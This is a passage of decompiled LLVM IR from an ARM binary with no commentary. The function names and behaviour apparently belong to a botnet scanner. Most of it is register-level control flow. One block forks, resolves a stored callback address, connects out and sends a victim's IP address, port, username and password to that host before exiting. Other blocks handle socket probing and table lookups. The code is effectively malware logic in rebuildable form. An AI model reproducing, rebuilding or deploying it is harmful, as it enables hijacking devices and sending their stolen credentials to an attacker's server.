  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1166c = icmp eq i32 %v0_11664, 0
  store i1 %v2_1166c, i1* %cpsr_z.global-to-local, align 1
  %tmp421 = icmp slt i32 %v0_11664, 1
  br i1 %tmp421, label %dec_label_pc_11490, label %dec_label_pc_11674

dec_label_pc_11674:                               ; preds = %dec_label_pc_1166c
  %v0_11674 = load i32, i32* @r5, align 4
  %v1_11674 = add i32 %v0_11674, 20
  %v2_11674 = inttoptr i32 %v1_11674 to i16*
  %v3_11674 = load i16, i16* %v2_11674, align 2
  %v4_11674 = zext i16 %v3_11674 to i32
  store i32 %v4_11674, i32* %r3.global-to-local, align 4
  %v1_11678 = add i32 %v0_11674, 16
  %v2_11678 = inttoptr i32 %v1_11678 to i32*
  %v3_11678 = load i32, i32* %v2_11678, align 4
  store i32 %v3_11678, i32* %r2.global-to-local, align 4
  store i32 %v2_1167c, i32* @lr, align 4
  store i32 %v4_11674, i32* %stack_var_-42, align 4
  store i32 %v3_11678, i32* %stack_var_-60, align 4
  %v1_11688 = inttoptr i32 %v0_11674 to i32*
  %v2_11688 = load i32, i32* %v1_11688, align 4
  store i32 %v2_11688, i32* @r8, align 4
  %v0_1168c = call i32 @__libc_fork()
  store i32 %v0_1168c, i32* %r0.global-to-local, align 4
  %v7_11690 = icmp eq i32 %v0_1168c, -1
  %.432 = zext i1 %v7_11690 to i32
  store i32 %.432, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1169c = icmp eq i32 %v0_1168c, 0
  store i1 %v2_1169c, i1* %cpsr_z.global-to-local, align 1
  %tmp424 = icmp slt i32 %v0_1168c, 1
  br i1 %tmp424, label %bb425, label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11674
  store i32 1, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116b0

bb425:                                            ; preds = %dec_label_pc_11674
  store i32 %.432, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116a8 = icmp eq i1 %v7_11690, false
  store i1 %v2_116a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116a8, label %dec_label_pc_11894, label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %.thread121, %bb425
  %v0_116b0 = load i32, i32* @r5, align 4
  %v1_116b0 = add i32 %v0_116b0, 4
  %v2_116b0 = inttoptr i32 %v1_116b0 to i32*
  %v3_116b0 = load i32, i32* %v2_116b0, align 4
  store i32 %v3_116b0, i32* %r0.global-to-local, align 4
  %v1_116b4 = call i32 @__GI___libc_close(i32 %v3_116b0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_116bc = load i32, i32* @r4, align 4
  %v1_116bc = load i32, i32* @r5, align 4
  %v2_116bc = add i32 %v1_116bc, 4
  %v3_116bc = inttoptr i32 %v2_116bc to i32*
  store i32 %v0_116bc, i32* %v3_116bc, align 4
  %v0_116c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_116c0 = load i32, i32* @r5, align 4
  %v2_116c0 = add i32 %v1_116c0, 12
  %v3_116c0 = inttoptr i32 %v2_116c0 to i32*
  store i32 %v0_116c0, i32* %v3_116c0, align 4
  br label %dec_label_pc_11490

dec_label_pc_116c8:                               ; preds = %dec_label_pc_115ac
  store i32 %v2_11570, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_116d4 = add i32 %v0_11598, 4
  %v2_116d4 = inttoptr i32 %v1_116d4 to i32*
  %v3_116d4 = load i32, i32* %v2_116d4, align 4
  store i32 %v3_116d4, i32* %r0.global-to-local, align 4
  %v4_116d8 = call i32 @__libc_send(i32 %v3_116d4, i32 %v2_11570, i32 3, i32 16384)
  store i32 %v4_116d8, i32* %r0.global-to-local, align 4
  store i32 %v2_11584, i32* %r1.global-to-local, align 4
  %v0_116e0 = load i32, i32* @r5, align 4
  %v1_116e0 = add i32 %v0_116e0, 4
  %v2_116e0 = inttoptr i32 %v1_116e0 to i32*
  %v3_116e0 = load i32, i32* %v2_116e0, align 4
  store i32 %v3_116e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11540

dec_label_pc_116f0:                               ; preds = %dec_label_pc_10cd0
  store i32 %.pre, i32* @r0, align 4
  %v1_116f8 = add i32 %v0_116f0, 92
  store i32 %v1_116f8, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_11700 = call i32 @memmove(i32 %.pre, i32 %v1_116f8, i32 192)
  store i32 %v3_11700, i32* %r0.global-to-local, align 4
  %v0_11704 = load i32, i32* @r5, align 4
  %v1_11704 = add i32 %v0_11704, 24
  %v2_11704 = inttoptr i32 %v1_11704 to i32*
  %v3_11704 = load i32, i32* %v2_11704, align 4
  %v1_11708 = add i32 %v3_11704, -64
  store i32 %v1_11708, i32* %r3.global-to-local, align 4
  store i32 %v1_11708, i32* %v2_11704, align 4
  br label %dec_label_pc_10ce0

dec_label_pc_11714:                               ; preds = %dec_label_pc_10e24
  %v0_11714 = load i32, i32* @r5, align 4
  store i32 %v0_11714, i32* @r0, align 4
  %v0_11718 = call i32 @setup_connection()
  store i32 %v0_11718, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e60

dec_label_pc_11720:                               ; preds = %dec_label_pc_1132c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_11720 = load i8, i8* %stack_var_-56, align 1
  %v4_11720 = sext i8 %v3_11720 to i32
  %v0_11724 = load i32, i32* @r6, align 4
  store i32 %v0_11724, i32* %r2.global-to-local, align 4
  %v1_11728 = add nsw i32 %v4_11720, -1
  store i32 %v1_11728, i32* %r3.global-to-local, align 4
  %v0_1172c = load i32, i32* @sl, align 4
  store i32 %v0_1172c, i32* %r0.global-to-local, align 4
  %v0_11730 = load i32, i32* @r5, align 4
  %v1_11730 = add i32 %v0_11730, 24
  %v2_11730 = inttoptr i32 %v1_11730 to i32*
  %v3_11730 = load i32, i32* %v2_11730, align 4
  store i32 %v3_11730, i32* %r1.global-to-local, align 4
  %v4_11734 = call i32 @util_memsearch(i32 %v0_1172c, i32 %v3_11730, i32 %v0_11724, i32 %v1_11728)
  store i32 %v4_11734, i32* %r0.global-to-local, align 4
  %v1_11738 = add i32 %v4_11734, 1
  store i32 %v1_11738, i32* @r7, align 4
  %v2_11738 = icmp eq i32 %v4_11734, -1
  store i1 %v2_11738, i1* %cpsr_c.global-to-local, align 1
  %v7_11738 = icmp eq i32 %v1_11738, 0
  store i1 %v7_11738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11738, label %dec_label_pc_11748, label %dec_label_pc_1138c

dec_label_pc_11748:                               ; preds = %dec_label_pc_11720
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_1174c = call i32 @table_lock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_11754 = call i32 @table_lock_val(i32 33)
  store i32 %v1_11754, i32* %r0.global-to-local, align 4
  %v0_11758 = load i32, i32* @r5, align 4
  %v1_11758 = add i32 %v0_11758, 12
  %v2_11758 = inttoptr i32 %v1_11758 to i32*
  %v3_11758 = load i32, i32* %v2_11758, align 4
  store i32 %v3_11758, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cc8.backedge

dec_label_pc_10cc8.backedge.thread:               ; preds = %dec_label_pc_10e8c, %dec_label_pc_10f60, %dec_label_pc_11034, %dec_label_pc_11108, %dec_label_pc_111dc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10cd0

dec_label_pc_10cc8.backedge.thread528:            ; preds = %dec_label_pc_11240, %dec_label_pc_11098, %dec_label_pc_10fc4, %dec_label_pc_1116c, %dec_label_pc_10ef0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10cd0

dec_label_pc_10cc8.backedge:                      ; preds = %dec_label_pc_10d44, %dec_label_pc_11748, %dec_label_pc_1184c
  %v0_10cd0186 = phi i32 [ %v0_11854, %dec_label_pc_1184c ], [ %v0_11758, %dec_label_pc_11748 ], [ %v0_10d44, %dec_label_pc_10d44 ]
  %v0_10cc8.be = phi i32 [ %v3_11854, %dec_label_pc_1184c ], [ %v3_11758, %dec_label_pc_11748 ], [ %v3_10d44, %dec_label_pc_10d44 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cc8 = icmp eq i32 %v0_10cc8.be, 0
  store i1 %v2_10cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cc8, label %dec_label_pc_10dd0, label %dec_label_pc_10cd0

dec_label_pc_11760:                               ; preds = %dec_label_pc_10c80
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_11354, i32* %r3.global-to-local, align 4
  store i32 %v2_11340, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  store i32 4, i32* %stack_var_-60, align 4
  %v5_1178c = call i32 @getsockopt(i32 %v3_10c74, i32 1, i32 4, i32 %v2_11354, i32 %v2_11340)
  %v3_11790 = load i8, i8* %stack_var_-56, align 1
  %v4_11790 = sext i8 %v3_11790 to i32
  store i32 %v4_11790, i32* %r3.global-to-local, align 4
  %v2_11794 = or i32 %v4_11790, %v5_1178c
  store i32 %v2_11794, i32* %r0.global-to-local, align 4
  %v4_11794 = icmp eq i32 %v2_11794, 0
  store i1 %v4_11794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_11794, label %dec_label_pc_1179c, label %dec_label_pc_11830

dec_label_pc_1179c:                               ; preds = %dec_label_pc_11760
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_117a0 = load i32, i32* @r5, align 4
  %v2_117a0 = add i32 %v1_117a0, 12
  %v3_117a0 = inttoptr i32 %v2_117a0 to i32*
  store i32 2, i32* %v3_117a0, align 4
  %v0_117a4 = call i32 @rand_next()
  %v2_117ac = load i16, i16* bitcast (i16** @global_var_246ec.169 to i16*), align 4
  %v3_117ac = zext i16 %v2_117ac to i32
  %v2_117b0 = udiv i32 %v0_117a4, %v3_117ac
  %v3_117b0 = urem i32 %v0_117a4, %v3_117ac
  store i32 %v2_117b0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_246bc.165 to i32), i32* %r3.global-to-local, align 4
  %v2_117b8 = load i32, i32* @global_var_246bc.165, align 4
  store i32 %v2_117b8, i32* %ip.global-to-local, align 4
  %v1_117c0 = load i32, i32* @r4, align 4
  %v9_117c0 = icmp eq i32 %v2_117b8, %v1_117c0
  store i1 %v9_117c0, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_117b0, i32* %r1.global-to-local, align 4
  %v7_117c8 = icmp sgt i32 %v2_117b8, %v1_117c0
  br i1 %v7_117c8, label %dec_label_pc_117cc, label %dec_label_pc_1180c

dec_label_pc_117cc:                               ; preds = %dec_label_pc_1179c
  %v2_117d0 = load i32, i32* @global_var_246e8.167, align 4
  store i32 %v2_117d0, i32* %r3.global-to-local, align 4
  store i32 %v1_117c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_117ec

dec_label_pc_117dc:                               ; preds = %dec_label_pc_117fc, %dec_label_pc_117ec
  %v1_117dc = add i32 %v0_117dc, 1
  store i32 %v1_117dc, i32* %r2.global-to-local, align 4
  %v9_117e0 = icmp eq i32 %v1_117dc, %v2_117b8
  %v1_117e4 = add i32 %v0_117e4, 16
  store i32 %v1_117e4, i32* %r3.global-to-local, align 4
  br i1 %v9_117e0, label %dec_label_pc_1180c.loopexit, label %dec_label_pc_117ec

dec_label_pc_117ec:                               ; preds = %dec_label_pc_117dc, %dec_label_pc_117cc
  %v0_117dc = phi i32 [ %v1_117dc, %dec_label_pc_117dc ], [ %v1_117c0, %dec_label_pc_117cc ]
  %v0_117e4 = phi i32 [ %v1_117e4, %dec_label_pc_117dc ], [ %v2_117d0, %dec_label_pc_117cc ]
  store i32 %v0_117e4, i32* %r0.global-to-local, align 4
  %v1_117f0 = add i32 %v0_117e4, 8
  %v2_117f0 = inttoptr i32 %v1_117f0 to i16*
  %v3_117f0 = load i16, i16* %v2_117f0, align 2
  %v4_117f0 = zext i16 %v3_117f0 to i32
  store i32 %v4_117f0, i32* %r3.global-to-local, align 4
  %tmp426 = icmp ugt i32 %v4_117f0, %v3_117b0
  br i1 %tmp426, label %dec_label_pc_117dc, label %dec_label_pc_117fc

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117ec
  %v1_117fc = add i32 %v0_117e4, 10
  %v2_117fc = inttoptr i32 %v1_117fc to i16*
  %v3_117fc = load i16, i16* %v2_117fc, align 2
  %v4_117fc = zext i16 %v3_117fc to i32
  store i32 %v4_117fc, i32* %r3.global-to-local, align 4
  %v3_11800 = icmp uge i32 %v4_117fc, %v3_117b0
  %v9_11800 = icmp eq i32 %v4_117fc, %v3_117b0
  %v2_11804 = xor i1 %v3_11800, true
  %v3_11804 = or i1 %v9_11800, %v2_11804
  br i1 %v3_11804, label %dec_label_pc_117dc, label %dec_label_pc_11810.loopexit

dec_label_pc_1180c.loopexit:                      ; preds = %dec_label_pc_117dc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1180c

dec_label_pc_1180c:                               ; preds = %dec_label_pc_1180c.loopexit, %dec_label_pc_1179c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11810

dec_label_pc_11810.loopexit:                      ; preds = %dec_label_pc_117fc
  store i1 %v3_11800, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11810

dec_label_pc_11810:                               ; preds = %dec_label_pc_11810.loopexit, %dec_label_pc_1180c
  %v0_11824 = phi i32 [ %v0_117e4, %dec_label_pc_11810.loopexit ], [ 0, %dec_label_pc_1180c ]
  %v0_11810 = load i32, i32* @r5, align 4
  %v1_11810 = add i32 %v0_11810, 4
  %v2_11810 = inttoptr i32 %v1_11810 to i32*
  %v3_11810 = load i32, i32* %v2_11810, align 4
  %v3_11814 = udiv i32 %v3_11810, 32
  store i32 %v3_11814, i32* %r2.global-to-local, align 4
  %v1_11818 = urem i32 %v3_11810, 32
  store i32 %v1_11818, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1181c = mul nuw nsw i32 %v3_11814, 4
  store i32 %v3_1181c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11824 = inttoptr i32 %v0_11810 to i32*
  store i32 %v0_11824, i32* %v2_11824, align 4
  %v0_11828 = load i32, i32* %r3.global-to-local, align 4
  %v1_11828 = load i32, i32* @r5, align 4
  %v2_11828 = add i32 %v1_11828, 24
  %v3_11828 = inttoptr i32 %v2_11828 to i32*
  store i32 %v0_11828, i32* %v3_11828, align 4
  %v0_10cb0.pre = load i32, i32* @ip, align 4
  %v1_10cb8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10ca8

dec_label_pc_11830:                               ; preds = %dec_label_pc_11760
  %v0_11830 = load i32, i32* @r5, align 4
  %v1_11830 = add i32 %v0_11830, 4
  %v2_11830 = inttoptr i32 %v1_11830 to i32*
  %v3_11830 = load i32, i32* %v2_11830, align 4
  store i32 %v3_11830, i32* %r0.global-to-local, align 4
  %v1_11834 = call i32 @__GI___libc_close(i32 %v3_11830)
  store i32 %v1_11834, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1183c = load i32, i32* @r4, align 4
  %v1_1183c = load i32, i32* @r5, align 4
  %v2_1183c = add i32 %v1_1183c, 12
  %v3_1183c = inttoptr i32 %v2_1183c to i32*
  store i32 %v0_1183c, i32* %v3_1183c, align 4
  %v0_11840 = load i32, i32* %r3.global-to-local, align 4
  %v1_11840 = load i32, i32* @r5, align 4
  %v2_11840 = add i32 %v1_11840, 4
  %v3_11840 = inttoptr i32 %v2_11840 to i32*
  store i32 %v0_11840, i32* %v3_11840, align 4
  %v0_11844 = load i32, i32* @r4, align 4
  %v1_11844 = trunc i32 %v0_11844 to i8
  %v2_11844 = load i32, i32* @r5, align 4
  %v3_11844 = add i32 %v2_11844, 284
  %v4_11844 = inttoptr i32 %v3_11844 to i8*
  store i8 %v1_11844, i8* %v4_11844, align 1
  br label %dec_label_pc_10dd0

dec_label_pc_1184c:                               ; preds = %thread-pre-split103
  %v1_11854 = add i32 %v0_11854, 12
  %v2_11854 = inttoptr i32 %v1_11854 to i32*
  %v3_11854 = load i32, i32* %v2_11854, align 4
  store i32 %v3_11854, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cc8.backedge

dec_label_pc_11894:                               ; preds = %bb425
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_118a0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_118a0, i32* %r0.global-to-local, align 4
  %v2_118a4 = icmp eq i32 %v3_118a0, -1
  store i1 %v2_118a4, i1* %cpsr_c.global-to-local, align 1
  %v7_118a4 = icmp eq i32 %v3_118a0, -1
  store i1 %v7_118a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_118a0, i32* @r4, align 4
  br i1 %v7_118a4, label %dec_label_pc_119f0, label %dec_label_pc_118b0

dec_label_pc_118b0:                               ; preds = %dec_label_pc_11894
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_118b4 = call i32 @table_unlock_val(i32 4)
  store i32 1042130361, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_271c0.114 to i32), i32* %r3.global-to-local, align 4
  %v0_118c0 = load i32, i32* @r6, align 4
  store i32 %v0_118c0, i32* %r1.global-to-local, align 4
  store i32 1042130361, i32* @global_var_271c4.116, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_118cc = inttoptr i32 %v0_118c0 to i32*
  %v3_118cc = call i32 @table_retrieve_val(i32 4, i32* %v2_118cc)
  store i32 %v2_1167c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_118e0 = call i32 @table_lock_val(i32 4)
  %v0_118e4 = load i32, i32* @r4, align 4
  store i32 %v0_118e4, i32* %r0.global-to-local, align 4
  store i32 %v2_1167c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_118f0 = call i32 @__libc_connect(i32 %v0_118e4, i32 %v2_1167c, i32 16)
  store i32 %v3_118f0, i32* %r0.global-to-local, align 4
  %v3_118f4 = icmp eq i32 %v3_118f0, -1
  store i1 %v3_118f4, i1* %cpsr_c.global-to-local, align 1
  %v8_118f4 = icmp eq i32 %v3_118f0, -1
  store i1 %v8_118f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_118f4, label %dec_label_pc_118fc, label %dec_label_pc_1194c

dec_label_pc_118fc:                               ; preds = %dec_label_pc_118b0
  %v0_118fc = load i32, i32* @r4, align 4
  store i32 %v0_118fc, i32* %r0.global-to-local, align 4
  %v1_11900 = call i32 @__GI___libc_close(i32 %v0_118fc)
  %v0_11904 = load i32, i32* @r6, align 4
  store i32 %v0_11904, i32* %r0.global-to-local, align 4
  %v1_11908 = call i32 @__GI_exit(i32 %v0_11904)
  store i32 %v1_11908, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %dec_label_pc_10d7c, %dec_label_pc_118fc
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_11910 = load i32, i32* @sb, align 4
  %v2_11910 = inttoptr i32 %v1_11910 to i32*
  store i32 104, i32* %v2_11910, align 4
  br label %dec_label_pc_10d94

dec_label_pc_11918:                               ; preds = %dec_label_pc_10b1c
  store i32 %v3_11918, i32* %r0.global-to-local, align 4
  %v3_11920 = udiv i32 %v3_11918, 32
  %v3_11924 = mul nuw nsw i32 %v3_11920, 4
  store i32 %v2_11928, i32* @lr, align 4
  %v2_1192c = add i32 %v3_11924, %v2_11928
  store i32 %v2_1192c, i32* %r3.global-to-local, align 4
  %v1_11930 = add i32 %v2_1192c, -312
  %v2_11930 = inttoptr i32 %v1_11930 to i32*
  %v3_11930 = load i32, i32* %v2_11930, align 4
  %v1_11934 = urem i32 %v3_11918, 32
  store i32 %v1_11934, i32* %r1.global-to-local, align 4
  %v7_11938 = shl i32 1, %v1_11934
  %v8_11938 = or i32 %v3_11930, %v7_11938
  store i32 %v8_11938, i32* %r2.global-to-local, align 4
  %v0_1193c = load i32, i32* @r5, align 4
  %v3_1193c = icmp uge i32 %v0_1193c, %v3_11918
  store i1 %v3_1193c, i1* %cpsr_c.global-to-local, align 1
  %v9_1193c = icmp eq i32 %v0_1193c, %v3_11918
  store i1 %v9_1193c, i1* %cpsr_z.global-to-local, align 1
  %v5_11940 = icmp slt i32 %v0_1193c, %v3_11918
  br i1 %v5_11940, label %bb427, label %bb428

bb427:                                            ; preds = %dec_label_pc_11918
  store i32 %v3_11918, i32* @r5, align 4
  br label %bb428

bb428:                                            ; preds = %dec_label_pc_11918, %bb427
  store i32 %v8_11938, i32* %v2_11930, align 4
  br label %bb378

dec_label_pc_1194c:                               ; preds = %dec_label_pc_118b0
  store i32 %v2_11354, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1195c = load i32, i32* @r4, align 4
  store i32 %v0_1195c, i32* %r0.global-to-local, align 4
  %v0_11960 = load i32, i32* @r6, align 4
  %v6_11960 = trunc i32 %v0_11960 to i8
  store i8 %v6_11960, i8* %stack_var_-56, align 1
  %v6_11964 = call i32 @__libc_send(i32 %v0_1195c, i32 %v2_11354, i32 1, i32 16384)
  store i32 %v2_11340, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11978 = load i32, i32* @r4, align 4
  store i32 %v0_11978, i32* %r0.global-to-local, align 4
  %v4_1197c = call i32 @__libc_send(i32 %v0_11978, i32 %v2_11340, i32 4, i32 16384)
  %v2_11984 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_11984, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11990 = load i32, i32* @r4, align 4
  store i32 %v0_11990, i32* %r0.global-to-local, align 4
  %v4_11994 = call i32 @__libc_send(i32 %v0_11990, i32 %v2_11984, i32 2, i32 16384)
  %v0_11998 = load i32, i32* @r8, align 4
  %v1_11998 = add i32 %v0_11998, 12
  store i32 %v1_11998, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_119a4 = load i32, i32* @r4, align 4
  store i32 %v0_119a4, i32* %r0.global-to-local, align 4
  %v4_119a8 = call i32 @__libc_send(i32 %v0_119a4, i32 %v1_11998, i32 1, i32 16384)
  store i32 %v4_119a8, i32* %r0.global-to-local, align 4
  %v0_119ac = load i32, i32* @r8, align 4
  %v1_119ac = inttoptr i32 %v0_119ac to i32*
  %v2_119ac = load i32, i32* %v1_119ac, align 4
  store i32 %v2_119ac, i32* %r1.global-to-local, align 4
  %v1_119b0 = add i32 %v0_119ac, 12
  %v2_119b0 = inttoptr i32 %v1_119b0 to i8*
  %v3_119b0 = load i8, i8* %v2_119b0, align 1
  %v4_119b0 = zext i8 %v3_119b0 to i32
  store i32 %v4_119b0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_119b8 = load i32, i32* @r4, align 4
  store i32 %v0_119b8, i32* %r0.global-to-local, align 4
  %v4_119bc = call i32 @__libc_send(i32 %v0_119b8, i32 %v2_119ac, i32 %v4_119b0, i32 16384)
  %v0_119c0 = load i32, i32* @r8, align 4
  %v1_119c0 = add i32 %v0_119c0, 13
  store i32 %v1_119c0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_119cc = load i32, i32* @r4, align 4
  store i32 %v0_119cc, i32* %r0.global-to-local, align 4
  %v4_119d0 = call i32 @__libc_send(i32 %v0_119cc, i32 %v1_119c0, i32 1, i32 16384)
  %v0_119d4 = load i32, i32* @r4, align 4
  store i32 %v0_119d4, i32* %r0.global-to-local, align 4
  %v0_119d8 = load i32, i32* @r8, align 4
  %v1_119d8 = add i32 %v0_119d8, 13
  %v2_119d8 = inttoptr i32 %v1_119d8 to i8*
  %v3_119d8 = load i8, i8* %v2_119d8, align 1
  %v4_119d8 = zext i8 %v3_119d8 to i32
  store i32 %v4_119d8, i32* %r2.global-to-local, align 4
  %v1_119dc = add i32 %v0_119d8, 4
  %v2_119dc = inttoptr i32 %v1_119dc to i32*
  %v3_119dc = load i32, i32* %v2_119dc, align 4
  store i32 %v3_119dc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_119e4 = call i32 @__libc_send(i32 %v0_119d4, i32 %v3_119dc, i32 %v4_119d8, i32 16384)
  %v0_119e8 = load i32, i32* @r4, align 4
  store i32 %v0_119e8, i32* %r0.global-to-local, align 4
  %v1_119ec = call i32 @__GI___libc_close(i32 %v0_119e8)
  store i32 %v1_119ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %dec_label_pc_11894, %dec_label_pc_1194c
  %v0_119f0 = load i32, i32* @r6, align 4
  store i32 %v0_119f0, i32* %r0.global-to-local, align 4
  %v1_119f4 = call i32 @__GI_exit(i32 %v0_119f0)
  store i32 %v1_119f4, i32* %r0.global-to-local, align 4
  ret i32 %v1_119f4

; uselistorder directives
  uselistorder i32 %v0_1193c, { 0, 2, 1 }
  uselistorder i32 %v1_11934, { 1, 0 }
  uselistorder i1 %v7_118a4, { 1, 0 }
  uselistorder i32 %v3_118a0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11854, { 1, 0 }
  uselistorder i32 %v3_11810, { 1, 0 }
  uselistorder i1 %v3_11800, { 1, 0 }
  uselistorder i32 %v0_117e4, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_117b0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_117ac, { 1, 0 }
  uselistorder i32 %v0_117a4, { 1, 0 }
  uselistorder i32 %v4_11734, { 1, 0, 2 }
  uselistorder i32 %v3_116e0, { 1, 0 }
  uselistorder i1 %v2_116a8, { 1, 0 }
  uselistorder i32 %.432, { 1, 0 }
  uselistorder i1 %v7_11690, { 1, 0 }
  uselistorder i32 %v0_1168c, { 2, 1, 0, 3 }
  uselistorder i1 %v7_11664, { 1, 0 }
  uselistorder i32 %v0_11664, { 2, 1, 0, 3 }
  uselistorder i32 %v0_115e8, { 1, 0 }
  uselistorder i32 %v0_115cc.pr, { 1, 0 }
  uselistorder i32 %v0_11598, { 1, 2, 0 }
  uselistorder i32 %v0_1155c, { 1, 0 }
  uselistorder i32 %v1_11554, { 1, 0 }
  uselistorder i32 %v1_1154c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_11548, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_11548, { 0, 2, 1 }
  uselistorder i32 %v0_11528.pr, { 1, 0 }
  uselistorder i32 %v0_11508.pr, { 1, 0 }
  uselistorder i1 %v7_114e0, { 1, 0 }
  uselistorder i1 %v2_114d0, { 1, 0, 2 }
  uselistorder i1 %v2_114b4, { 1, 0, 2 }
  uselistorder i32 %v1_114d4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_114a8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_114d8, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_1145c, { 1, 0 }
  uselistorder i32 %v0_11854, { 1, 0, 2 }
  uselistorder i1 %v0_1144c, { 1, 0 }
  uselistorder i32 %v4_11440, { 1, 0, 2 }
  uselistorder i32 %v1_1140c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1140c, { 0, 2, 1 }
  uselistorder i32 %v0_11404, { 1, 0 }
  uselistorder i1 %v7_11400, { 1, 0 }
  uselistorder i1 %v7_113f8, { 1, 0 }
  uselistorder i1 %v8_113f0, { 1, 0 }
  uselistorder i1 %v7_113d4, { 1, 0 }
  uselistorder i1 %v7_113cc, { 1, 0 }
  uselistorder i1 %v8_113c4, { 1, 0 }
  uselistorder i32 %v1_113ac, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v7_1137c, { 1, 0 }
  uselistorder i32 %v1_11324, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11324, { 0, 2, 1 }
  uselistorder i32 %v0_1131c, { 1, 0 }
  uselistorder i1 %v7_11318, { 1, 0 }
  uselistorder i1 %v7_11310, { 1, 0 }
  uselistorder i1 %v7_11308, { 1, 0 }
  uselistorder i1 %v8_11300, { 1, 0 }
  uselistorder i1 %v7_112e4, { 1, 0 }
  uselistorder i1 %v7_112dc, { 1, 0 }
  uselistorder i1 %v7_112d4, { 1, 0 }
  uselistorder i1 %v8_112cc, { 1, 0 }
